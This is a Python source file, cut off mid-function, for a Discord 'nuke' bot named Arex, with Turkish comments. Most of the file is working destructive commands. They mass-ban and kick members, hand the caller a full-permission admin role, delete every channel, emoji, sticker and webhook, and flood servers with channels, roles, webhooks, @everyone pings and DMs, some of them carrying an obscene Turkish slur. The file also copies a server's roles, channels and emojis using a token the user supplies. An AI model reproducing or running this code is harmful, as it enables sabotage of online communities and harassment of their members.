import discord
from discord.ext import commands
import asyncio
import aiohttp
import json
import requests
from datetime import datetime
import os
from flask import Flask
from threading import Thread

# Flask web sunucusu (UptimeRobot için)
app = Flask('')

@app.route('/')
def home():
    return "Bot Aktif!"

def run():
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    t = Thread(target=run)
    t.start()

# Bot ayarları
intents = discord.Intents.all()
bot = commands.Bot(command_prefix='!', intents=intents, help_command=None)

# Embed renkleri
EMBED_COLOR = 0x5865F2
ERROR_COLOR = 0xFF0000
SUCCESS_COLOR = 0x00FF00

# Sunucu kopyalama fonksiyonu
async def copy_server(ctx, source_guild_id, target_guild_id, token):
    try:
        headers = {
            'Authorization': f'Bot {token}',
            'Content-Type': 'application/json'
        }
        
        # Kaynak sunucudan verileri al
        async with aiohttp.ClientSession() as session:
            # Rolleri kopyala
            async with session.get(f'https://discord.com/api/v9/guilds/{source_guild_id}/roles', headers=headers) as resp:
                roles = await resp.json()
            
            # Kanalları kopyala
            async with session.get(f'https://discord.com/api/v9/guilds/{source_guild_id}/channels', headers=headers) as resp:
                channels = await resp.json()
            
            # Emojileri kopyala
            async with session.get(f'https://discord.com/api/v9/guilds/{source_guild_id}/emojis', headers=headers) as resp:
                emojis = await resp.json()
            
            # Hedef sunucuya yapıştır
            target_headers = {
                'Authorization': f'Bot {bot.http.token}',
                'Content-Type': 'application/json'
            }
            
            # Rolleri oluştur
            role_mapping = {}
            for role in reversed(roles):  # En yüksek yetkiden başla
                if role['name'] != '@everyone':
                    data = {
                        'name': role['name'],
                        'color': role['color'],
                        'hoist': role['hoist'],
                        'mentionable': role['mentionable'],
                        'permissions': role['permissions']
                    }
                    async with session.post(f'https://discord.com/api/v9/guilds/{target_guild_id}/roles', 
                                          headers=target_headers, json=data) as resp:
                        new_role = await resp.json()
                        role_mapping[role['id']] = new_role['id']
            
            # Kategorileri oluştur
            category_mapping = {}
            for channel in channels:
                if channel['type'] == 4:  # Kategori
                    data = {
                        'name': channel['name'],
                        'type': 4,
                        'position': channel['position']
                    }
                    async with session.post(f'https://discord.com/api/v9/guilds/{target_guild_id}/channels', 
                                          headers=target_headers, json=data) as resp:
                        new_category = await resp.json()
                        category_mapping[channel['id']] = new_category['id']
            
            # Kanalları oluştur
            for channel in channels:
                if channel['type'] != 4:  # Kategori değilse
                    data = {
                        'name': channel['name'],
                        'type': channel['type'],
                        'position': channel['position'],
                        'topic': channel.get('topic', ''),
                        'nsfw': channel.get('nsfw', False),
                        'bitrate': channel.get('bitrate', 64000),
                        'user_limit': channel.get('user_limit', 0)
                    }
                    
                    # Parent kategori varsa
                    if channel.get('parent_id'):
                        data['parent_id'] = category_mapping.get(channel['parent_id'])
                    
                    # İzinleri kopyala
                    if channel.get('permission_overwrites'):
                        overwrites = []
                        for overwrite in channel['permission_overwrites']:
                            new_overwrite = {
                                'id': role_mapping.get(overwrite['id'], overwrite['id']),
                                'type': overwrite['type'],
                                'allow': overwrite['allow'],
                                'deny': overwrite['deny']
                            }
                            overwrites.append(new_overwrite)
                        data['permission_overwrites'] = overwrites
                    
                    async with session.post(f'https://discord.com/api/v9/guilds/{target_guild_id}/channels', 
                                          headers=target_headers, json=data) as resp:
                        await resp.json()
            
            # Emojileri yükle
            for emoji in emojis:
                emoji_url = f"https://cdn.discordapp.com/emojis/{emoji['id']}.{'gif' if emoji['animated'] else 'png'}"
                async with session.get(emoji_url) as img_resp:
                    emoji_data = await img_resp.read()
                
                form_data = aiohttp.FormData()
                form_data.add_field('image', emoji_data, filename=f"{emoji['name']}.{'gif' if emoji['animated'] else 'png'}")
                form_data.add_field('name', emoji['name'])
                
                async with session.post(f'https://discord.com/api/v9/guilds/{target_guild_id}/emojis', 
                                      headers=target_headers, data=form_data) as resp:
                    await resp.json()
            
            return True
            
    except Exception as e:
        print(f"Hata: {e}")
        return False

# Bot hazır olduğunda
@bot.event
async def on_ready():
    print(f'{bot.user} olarak giriş yapıldı!')
    await bot.change_presence(activity=discord.Game(name="Arex | /help"))

# Yardım komutu
@bot.command()
async def help(ctx):
    embed = discord.Embed(
        title="🔧 Arex Bot Komutları",
        description="Gelişmiş sunucu yönetim aracı",
        color=EMBED_COLOR
    )
    
    embed.add_field(name="📋 Sunucu Kopyalama", value="`/kopyala <kaynak_id> <hedef_id> <token>`", inline=False)
    embed.add_field(name="💣 Nuke Komutları", value="Aşağıdaki tüm yıkım komutları", inline=False)
    
    nuke_commands = """
    `/sunucu` - Sunucu bilgileri
    `/kullanici` - Kullanıcı bilgileri
    `/botlist` - Botları listele
    `/roller` - Rolleri listele
    `/kanallar` - Kanalları listele
    `/admins` - Adminleri listele
    `/ban <sayi>` - Üye banla (Max: 50000)
    `/everyone_kick` - Herkesi at
    `/yetki` - Admin rolü oluştur
    `/kanal_sil` - Tüm kanalları sil
    `/kanal_sp <isim> <sayi>` - Kanal oluştur (Max: 50000)
    `/kanal_finish` - 250 'SİKİLDİNİZ' kanalı
    `/voice_spam <sayi>` - Ses kanalı spam (Max: 50000)
    `/category_sp <isim> <sayi>` - Kategori spam (Max: 50000)
    `/isimall <isim>` - Herkesin ismini değiştir
    `/rolall` - 'SİKİLDİNİZ' rolü ver
    `/dm_all <mesaj>` - Herkese DM gönder
    `/rol_sp <isim> <sayi>` - Rol spam (Max: 50000)
    `/rainbow_rol <rol>` - Rol rengini değiştir
    `/yazi_sp <mesaj> <sayi>` - Mesaj spam (Max: 50000)
    `/yazi_sp2 <mesaj> <sayi>` - Tüm kanallara mesaj
    `/ping_spam` - @everyone spam
    `/emoji_sil` - Tüm emojileri sil
    `/sticker_sil` - Tüm stickerları sil
    `/sunucu_resim <url>` - Sunucu resmini değiştir
    `/webhook_sp <sayi>` - Webhook spam (Max: 50000)
    `/webhook_sil` - Webhookları sil
    `/sunucu_isim <isim>` - Sunucu ismini değiştir
    `/url <url>` - Sunucu URL'sini değiştir
    `/lock_server` - Sunucuyu kilitle
    `/unlock_server` - Kilidi aç
    `/nuke` - Tam nuke
    `/kaos` - Kanalları karıştır
    `/key_ver <kullanici> <sure>` - Key ver
    `/key_al <kullanici>` - Key'i al
    `/key_kullan <key>` - Key kullan
    """
    
    embed.add_field(name="⚡ Hızlı Komutlar", value=nuke_commands, inline=False)
    embed.set_footer(text="Arex Bot | Gelişmiş Sunucu Yönetimi")
    
    await ctx.send(embed=embed)

# Sunucu kopyalama komutu
@bot.command()
async def kopyala(ctx, kaynak_id: int, hedef_id: int, token: str):
    embed = discord.Embed(
        title="📥 Sunucu Kopyalama Başlatıldı",
        description=f"Kaynak: `{kaynak_id}` → Hedef: `{hedef_id}`",
        color=EMBED_COLOR
    )
    embed.add_field(name="⏳ Durum", value="Kopyalama işlemi başlatılıyor...", inline=False)
    embed.set_footer(text="Bu işlem birkaç dakika sürebilir")
    
    msg = await ctx.send(embed=embed)
    
    success = await copy_server(ctx, kaynak_id, hedef_id, token)
    
    if success:
        embed = discord.Embed(
            title="✅ Sunucu Başarıyla Kopyalandı",
            description=f"Tüm veriler `{hedef_id}` ID'li sunucuya aktarıldı!",
            color=SUCCESS_COLOR
        )
        embed.add_field(name="📊 İstatistikler", 
                       value="• Tüm roller kopyalandı\n• Tüm kanallar oluşturuldu\n• Emojiler yüklendi\n• Ayarlar aktarıldı", 
                       inline=False)
        embed.set_footer(text="Arex Bot | Premium Kopyalama Sistemi")
    else:
        embed = discord.Embed(
            title="❌ Kopyalama Başarısız",
            description="Bir hata oluştu. Token veya izinleri kontrol edin.",
            color=ERROR_COLOR
        )
    
    await msg.edit(embed=embed)

# NUKE KOMUTLARI

@bot.command()
async def sunucu(ctx):
    guild = ctx.guild
    embed = discord.Embed(title=f"📊 {guild.name} Bilgileri", color=EMBED_COLOR)
    embed.add_field(name="👑 Sahip", value=guild.owner, inline=True)
    embed.add_field(name="👥 Üye Sayısı", value=guild.member_count, inline=True)
    embed.add_field(name="📅 Oluşturulma", value=guild.created_at.strftime("%d/%m/%Y"), inline=True)
    embed.add_field(name="🔢 ID", value=guild.id, inline=True)
    embed.add_field(name="🌍 Bölge", value=str(guild.preferred_locale), inline=True)
    embed.add_field(name="📈 Seviye", value=guild.premium_tier, inline=True)
    await ctx.send(embed=embed)

@bot.command()
async def kullanici(ctx, member: discord.Member = None):
    member = member or ctx.author
    embed = discord.Embed(title=f"👤 {member.name} Bilgileri", color=EMBED_COLOR)
    embed.set_thumbnail(url=member.avatar.url)
    embed.add_field(name="🏷️ ID", value=member.id, inline=True)
    embed.add_field(name="📅 Katılma", value=member.joined_at.strftime("%d/%m/%Y"), inline=True)
    embed.add_field(name="🎭 En Yüksek Rol", value=member.top_role.name, inline=True)
    await ctx.send(embed=embed)

@bot.command()
async def botlist(ctx):
    bots = [member for member in ctx.guild.members if member.bot]
    embed = discord.Embed(title="🤖 Sunucudaki Botlar", color=EMBED_COLOR)
    bot_list = "\n".join([f"{bot.mention} - {bot.name}" for bot in bots[:20]])
    embed.description = bot_list or "Bot bulunamadı"
    await ctx.send(embed=embed)

@bot.command()
async def roller(ctx):
    roles = ctx.guild.roles[1:]  # @everyone hariç
    embed = discord.Embed(title="🎭 Sunucu Rolleri", color=EMBED_COLOR)
    role_list = "\n".join([f"{role.mention} - {len(role.members)} üye" for role in roles[:25]])
    embed.description = role_list
    await ctx.send(embed=embed)

@bot.command()
async def kanallar(ctx):
    channels = ctx.guild.channels
    embed = discord.Embed(title="📁 Sunucu Kanalları", color=EMBED_COLOR)
    text_channels = [c for c in channels if isinstance(c, discord.TextChannel)]
    voice_channels = [c for c in channels if isinstance(c, discord.VoiceChannel)]
    
    embed.add_field(name="💬 Yazı Kanalları", value=str(len(text_channels)), inline=True)
    embed.add_field(name="🔊 Ses Kanalları", value=str(len(voice_channels)), inline=True)
    embed.add_field(name="📂 Kategoriler", value=str(len(ctx.guild.categories)), inline=True)
    
    await ctx.send(embed=embed)

@bot.command()
async def admins(ctx):
    admins = [member for member in ctx.guild.members if member.guild_permissions.administrator]
    embed = discord.Embed(title="👑 Sunucu Adminleri", color=EMBED_COLOR)
    admin_list = "\n".join([f"{admin.mention} - {admin.name}" for admin in admins[:20]])
    embed.description = admin_list or "Admin bulunamadı"
    await ctx.send(embed=embed)

@bot.command()
async def ban(ctx, sayi: int):
    if sayi > 50000:
        sayi = 50000
    
    count = 0
    for member in ctx.guild.members:
        if not member.bot and member != ctx.guild.owner and member != ctx.author:
            try:
                await member.ban(reason="Nuke bot tarafından")
                count += 1
                if count >= sayi:
                    break
            except:
                pass
    
    await ctx.send(f"✅ {count} üye banlandı!")

@bot.command()
async def everyone_kick(ctx):
    for member in ctx.guild.members:
        if not member.bot and member != ctx.guild.owner and member != ctx.author:
            try:
                await member.kick(reason="Nuke bot tarafından")
            except:
                pass
    
    await ctx.send("✅ Tüm üyeler atıldı!")

@bot.command()
async def yetki(ctx):
    role = await ctx.guild.create_role(name="Levix Admin", permissions=discord.Permissions.all())
    await ctx.author.add_roles(role)
    await ctx.send(f"✅ {role.mention} rolü oluşturuldu ve size verildi!")

@bot.command()
async def kanal_sil(ctx):
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
        except:
            pass
    
    await ctx.send("✅ Tüm kanallar silindi!")

@bot.command()
async def kanal_sp(ctx, isim: str, sayi: int):
    if sayi > 50000:
        sayi = 50000
    
    for i in range(sayi):
        try:
            await ctx.guild.create_text_channel(f"{isim}-{i+1}")
        except:
            pass
    
    await ctx.send(f"✅ {sayi} adet '{isim}' kanalı oluşturuldu!")

@bot.command()
async def kanal_finish(ctx):
    for i in range(250):
        try:
            await ctx.guild.create_text_channel(f"SİKİLDİNİZ-{i+1}")
        except:
            pass
    
    await ctx.send("✅ 250 adet 'SİKİLDİNİZ' kanalı oluşturuldu!")

@bot.command()
async def voice_spam(ctx, sayi: int):
    if sayi > 50000:
        sayi = 50000
    
    for i in range(sayi):
        try:
            await ctx.guild.create_voice_channel(f"Spam-{i+1}")
        except:
            pass
    
    await ctx.send(f"✅ {sayi} adet ses kanalı oluşturuldu!")

@bot.command()
async def category_sp(ctx, isim: str, sayi: int):
    if sayi > 50000:
        sayi = 50000
    
    for i in range(sayi):
        try:
            await ctx.guild.create_category(f"{isim}-{i+1}")
        except:
            pass
    
    await ctx.send(f"✅ {sayi} adet '{isim}' kategorisi oluşturuldu!")

@bot.command()
async def isimall(ctx, isim: str):
    for member in ctx.guild.members:
        try:
            await member.edit(nick=isim)
        except:
            pass
    
    await ctx.send(f"✅ Tüm üyelerin ismi '{isim}' olarak değiştirildi!")

@bot.command()
async def rolall(ctx):
    role = await ctx.guild.create_role(name="SİKİLDİNİZ", color=discord.Color.red())
    
    for member in ctx.guild.members:
        try:
            await member.add_roles(role)
        except:
            pass
    
    await ctx.send(f"✅ '{role.name}' rolü oluşturuldu ve herkese verildi!")

@bot.command()
async def dm_all(ctx, *, mesaj: str):
    for member in ctx.guild.members:
        if not member.bot:
            try:
                await member.send(mesaj)
            except:
                pass
    
    await ctx.send("✅ Tüm üyelere DM gönderildi!")

@bot.command()
async def rol_sp(ctx, isim: str, sayi: int):
    if sayi > 50000:
        sayi = 50000
    
    for i in range(sayi):
        try:
            await ctx.guild.create_role(name=f"{isim}-{i+1}")
        except:
            pass
    
    await ctx.send(f"✅ {sayi} adet '{isim}' rolü oluşturuldu!")

@bot.command()
async def rainbow_rol(ctx, role: discord.Role):
    colors = [0xFF0000, 0xFF7F00, 0xFFFF00, 0x00FF00, 0x0000FF, 0x4B0082, 0x9400D3]
    
    async def rainbow_loop():
        while True:
            for color in colors:
                try:
                    await role.edit(color=discord.Color(color))
                    await asyncio.sleep(1)
                except:
                    break
    
    asyncio.create_task(rainbow_loop())
    await ctx.send(f"✅ {role.mention} rolü rainbow moduna alındı!")

@bot.command()
async def yazi_sp(ctx, mesaj: str, sayi: int):
    if sayi > 50000:
        sayi = 50000
    
    for i in range(sayi):
        await ctx.send(mesaj)
    
    await ctx.send(f"✅ {sayi} kez '{mesaj}' mesajı gönderildi!")

@bot.command()
async def yazi_sp2(ctx, mesaj: str, sayi: int):
    if sayi > 50000:
        sayi = 50000
    
    channels = [c for c in ctx.guild.channels if isinstance(c, discord.TextChannel)]
    
    for i in range(sayi):
        for channel in channels[:50]:  # İlk 50 kanal
            try:
                await channel.send(mesaj)
            except:
                pass
    
    await ctx.send(f"✅ Tüm kanallara {sayi} kez '{mesaj}' mesajı gönderildi!")

@bot.command()
async def ping_spam(ctx):
    async def spam():
        while True:
            try:
                await ctx.send("@everyone")
                await asyncio.sleep(0.5)
            except:
                break
    
    asyncio.create_task(spam())
    await ctx.send("✅ Ping spam başlatıldı!")

@bot.command()
async def emoji_sil(ctx):
    for emoji in ctx.guild.emojis:
        try:
            await emoji.delete()
        except:
            pass
    
    await ctx.send("✅ Tüm emojiler silindi!")

@bot.command()
async def sticker_sil(ctx):
    for sticker in ctx.guild.stickers:
        try:
            await sticker.delete()
        except:
            pass
    
    await ctx.send("✅ Tüm stickerlar silindi!")

@bot.command()
async def sunucu_resim(ctx, url: str):
    async with aiohttp.ClientSession() as session:
        async with session.get(url) as resp:
            img_data = await resp.read()
    
    await ctx.guild.edit(icon=img_data)
    await ctx.send("✅ Sunucu resmi değiştirildi!")

@bot.command()
async def webhook_sp(ctx, sayi: int):
    if sayi > 50000:
        sayi = 50000
    
    channels = [c for c in ctx.guild.channels if isinstance(c, discord.TextChannel)]
    
    for i in range(sayi):
        for channel in channels[:10]:  # İlk 10 kanal
            try:
                webhook = await channel.create_webhook(name=f"Spam-{i+1}")
                await webhook.send("@everyone SUNUCU SİKİLDİ!")
            except:
                pass
    
    await ctx.send(f"✅ {sayi} webhook oluşturuldu ve mesaj gönderildi!")

@bot.command()
async def webhook_sil(ctx):
    for channel in ctx.guild.channels:
        if isinstance(channel, discord.TextChannel):
            webhooks = await channel.webhooks()
            for webhook in webhooks:
                try:
                    await webhook.delete()
                except:
                    pass
    
    await ctx.send("✅ Tüm webhooklar silindi!")

@bot.command()
async def sunucu_isim(ctx, *, isim: str):
    await ctx.guild.edit(name=isim)
    await ctx.send(f"✅ Sunucu ismi '{isim}' olarak değiştirildi!")

@bot.command()
async def url(ctx, url_adı: str):
    try:
        await ctx.guild.edit(vanity_code=url_adı)
        await ctx.send(f"✅ Sunucu URL'si 'discord.gg/{url_adı}' olarak değiştirildi!")
    except:
        await ctx.send("❌ URL değiştirme yetkiniz yok!")

@bot.command()
async def lock_server(ctx):
    for channel in ctx.guild.channels:
        if isinstance(channel, discord.TextChannel):
            try:
                await channel.set_permissions(ctx.guild.default_role, send_messages=F
